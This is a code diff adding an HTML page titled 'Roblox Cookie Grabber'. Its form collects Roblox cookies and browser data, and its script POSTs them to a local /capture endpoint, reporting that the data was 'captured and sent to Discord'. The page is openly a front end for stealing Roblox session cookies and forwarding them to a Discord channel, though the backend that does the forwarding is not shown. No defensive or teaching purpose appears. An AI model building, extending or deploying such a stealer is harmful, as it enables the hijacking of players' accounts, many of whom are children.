@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Grabber</title>
+</head>
+<body>
+    <h1>Roblox Cookie Grabber</h1>
+    <form id="captureForm">
+        <label for="cookies">Roblox Cookies:</label>
+        <input type="text" id="cookies" name="cookies" required><br><br>
+        <label for="browserData">Browser Data:</label>
+        <input type="text" id="browserData" name="browserData" required><br><br>
+        <button type="submit">Capture and Send</button>
+    </form>
+
+    <script>
+        document.getElementById('captureForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const cookies = document.getElementById('cookies').value;
+            const browserData = document.getElementById('browserData').value;
+
+            const response = await fetch('http://localhost:3000/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies, browserData })
+            });
+
+            if (response.ok) {
+                alert('Data captured and sent to Discord!');
+            } else {
+                alert('Failed to capture and send data.');
+            }
+        });
+    </script>
+</body>
+</html>
